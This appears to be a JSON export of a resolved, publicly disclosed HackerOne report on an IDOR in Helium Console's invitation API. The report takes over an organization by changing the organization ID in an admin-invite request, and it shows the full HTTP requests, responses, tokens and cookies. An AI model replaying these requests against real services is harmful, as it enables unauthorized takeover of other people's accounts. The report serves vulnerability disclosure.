@@ -1,0 +1,132 @@
+{
+  "id": 835005,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzUwMDU=",
+  "url": "https://hackerone.com/reports/835005",
+  "title": "Organization Takeover via invitation API",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-31T02:05:09.252Z",
+  "submitted_at": "2020-03-31T02:05:09.252Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "azraelsec",
+    "url": "/azraelsec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/o7VhFZ84pwCBpr6g4ygW9t21/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 12172,
+    "url": "https://hackerone.com/helium",
+    "handle": "helium",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/172/c6ee5425ee5cb13a9616336667e01488d68f161f_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/172/c6ee5425ee5cb13a9616336667e01488d68f161f_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Helium",
+      "twitter_handle": "helium",
+      "website": "http://www.helium.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-05-27T20:51:32.273Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-04-27T20:51:05.884Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello @helium,\ntoday I would like to show you how a malicious user could exploit an IDOR affecting the `/invitations` resource to gain Administrator privileges inside an organization of which he's part of as a reader.\n\n# Steps to reproduce the bug\n## Setup\nLet's assume that three accounts exist:\n- `azraelsec@wearehackerone.com` **[Attacker]**\n- `azraelsec+test@wearehackerone.com` **[Victim]**\n- `azraelsec+1@wearehackerone.com` **[Attacker's fake account]**\n\n**Initial Context**: **[Victim]** is Administrator of the `target` organization on Helium Console and invites **[Attacker]** to join it as a reader.\n**Goal**: **[Attacker]** escalate its privileges and becomes Administrator of the `target` organization\n\n## Attack\n1) **[Attacker]** makes a graphql query to leak the organization's id (using graphql it's only possible to see the memberships of the current organization):\n```\nPOST /graphql HTTP/1.1\nHost: console.helium.com\nConnection: close\nContent-Length: 469\naccept: */*\nSec-Fetch-Dest: empty\nauthorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\ncontent-type: application/json\nOrigin: https://console.helium.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nReferer: https://console.helium.com/dashboard\nAccept-Encoding: gzip, deflate\nAccept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6\nCookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4NjQwNDMsImV2ZW50SWQiOjU2MywiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6NjczfQ==\n\n{\"operationName\":\"PaginatedOrganizationsQuery\",\"variables\":{\"page\":1,\"pageSize\":10},\"query\":\"query PaginatedOrganizationsQuery($page: Int, $pageSize: Int) {\\n  organizations(page: $page, pageSize: $pageSize) {\\n    entries {\\n      ...OrganizationFragment\\n      __typename\\n    }\\n    totalEntries\\n    totalPages\\n    pageSize\\n    pageNumber\\n    __typename\\n  }\\n}\\n\\nfragment OrganizationFragment on Organization {\\n  id\\n  name\\n  inserted_at\\n  __typename\\n}\\n\"}\n```\n```\nHTTP/1.1 200 OK\nDate: Tue, 31 Mar 2020 01:07:44 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nCache-Control: max-age=0, private, must-revalidate\nStrict-Transport-Security: max-age=31536000\nVia: 1.1 vegur\nCF-Cache-Status: DYNAMIC\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 57c62cdb39b0be28-MXP\nContent-Length: 401\n\n{\"data\":{\"organizations\":{\"__typename\":\"PaginatedOrganizations\",\"entries\":[{\"__typename\":\"Organization\",\"id\":\"883b0a46-e4cf-4315-af4f-4226d1ada561\",\"inserted_at\":\"2020-03-31T00:58:34\",\"name\":\"lol\"},{\"__typename\":\"Organization\",\"id\":\"cb23000e-65b3-4628-9ede-656ffa0d5aa8\",\"inserted_at\":\"2020-03-31T01:05:42\",\"name\":\"target\"}],\"pageNumber\":null,\"pageSize\":null,\"totalEntries\":null,\"totalPages\":null}}}\n```\n**NOTE**: the `target` organization's id is `cb23000e-65b3-4628-9ede-656ffa0d5aa8`\n\n2) Using its own organization's page **[Attacker]** makes a request to the `/api/invitations` end-point in order to add **[Attacker's fake account]** to it in the role of *admin* and intercepts this request through Burp Suite. It looks like this:\n```\nPOST /api/invitations HTTP/1.1\nHost: console.helium.com\nConnection: close\nContent-Length: 125\nAccept: application/json, text/plain, */*\nSec-Fetch-Dest: empty\nAuthorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\nContent-Type: application/json\nOrigin: https://console.helium.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nReferer: https://console.helium.com/users\nAccept-Encoding: gzip, deflate\nAccept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6\nCookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4OTQ2OTYsImV2ZW50SWQiOjU2NiwiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6Njc2fQ==\n\n{\"invitation\":{\"email\":\"azraelsec+1@wearehackerone.com\",\"role\":\"admin\",\"organization\":\"883b0a46-e4cf-4315-af4f-4226d1ada561\"}}\n```\n3) **[Attacker]** now only needs to change the organization field's value inserting the `target` one:\n```\nPOST /api/invitations HTTP/1.1\nHost: console.helium.com\nConnection: close\nContent-Length: 126\nAccept: application/json, text/plain, */*\nSec-Fetch-Dest: empty\nAuthorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\nContent-Type: application/json\nOrigin: https://console.helium.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nReferer: https://console.helium.com/users\nAccept-Encoding: gzip, deflate\nAccept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6\nCookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4OTQ2OTYsImV2ZW50SWQiOjU2NiwiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6Njc2fQ==\n\n{\"invitation\":{\"email\":\"azraelsec+1@wearehackerone.com\",\"role\":\"admin\",\"organization\":\"cb23000e-65b3-4628-9ede-656ffa0d5aa8\"}}\n```\n```\nHTTP/1.1 201 Created\nDate: Tue, 31 Mar 2020 01:08:59 GMT\nContent-Type: application/json; charset=utf-8\nContent-Length: 115\nConnection: close\nCache-Control: max-age=0, private, must-revalidate\nMessage: User added to organization\nStrict-Transport-Security: max-age=31536000\nVia: 1.1 vegur\nCF-Cache-Status: DYNAMIC\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 57c62eaa4ccde903-MXP\n\n{\"id\":\"a0262e0c-7939-42dd-a4ec-e42dc2eeaeab\",\"joined_at\":\"2020-03-31T01:08:59\",\"role\":\"admin\",\"type\":\"memberships\"}\n```\n4) Now **[Attacker's fake account]** has got full privileges on the `target` organization and can properly change **[Attacker]**'s role to Administrator and he can delete the original owner.\n\n# Mitigations\nTo be sure that the requesting user is an Administrator of that organization is enough to solve this issue.\n\n## Impact\n\nThis vulnerability has got a great impact on the platform as it allows any user to gain Administrator privileges on organizations he's part of, full controlling it.",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 766868,
+      "file_name": "Organization_Takeover_via_Invitations.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FebXSgToGPJjhN9AcdEoGCVV?response-content-disposition=attachment%3B%20filename%3D%22Organization_Takeover_via_Invitations.mp4%22%3B%20filename%2A%3DUTF-8%27%27Organization_Takeover_via_Invitations.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134106Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=47fc7d438c592daa4c5f140c91d7fcdfac9f165e74138e0f79ea484f8f9ffe59",
+      "file_size": 8935859,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-05-27T20:51:05.976Z",
+  "allow_singular_disclosure_after": -117219000.3839663,
+  "singular_disclosure_allowed": true,
+  "vote_count": 27,
+  "voters": [
+    "th3hidd3nmist",
+    "jensec",
+    "foobar7",
+    "base_64",
+    "ali",
+    "brahim_boufakri01",
+    "mik317",
+    "johndoe1492",
+    "rashedul_css",
+    "darkerhack",
+    "and 17 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 43253,
+    "asset_type": "URL",
+    "asset_identifier": "https://helium-console-dev.herokuapp.com/",
+    "max_severity": "high"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
